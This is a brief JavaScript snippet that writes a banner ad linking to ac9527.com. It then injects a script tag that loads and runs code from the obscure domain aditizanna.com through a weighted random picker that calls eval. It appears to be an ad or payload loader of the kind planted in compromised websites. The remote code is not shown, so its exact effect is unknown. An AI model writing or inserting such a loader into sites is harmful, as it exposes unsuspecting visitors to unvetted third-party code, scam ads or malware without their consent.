document.writeln("<a href=\'https://ac9527.com/\'><img style=\'width: 100%;max-width: 100%;max-height:120px;min-height: 100px;\' src=\'https://cdn.jsdelivr.net/gh/cdnoo/index@main/tu/2.gif\' data-src=\'https://cdn.jsdelivr.net/gh/cdnoo/index@main/tu/2.gif\'></a>");
var randoms = {
	ads_codes: ['<script type="text/javascript" src="https://aditizanna.com/gczffarpq/puaqc1idk0bvtzub4jgvm/1704/puaqc"><'+'/script>'],
	ads_weight: [10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();
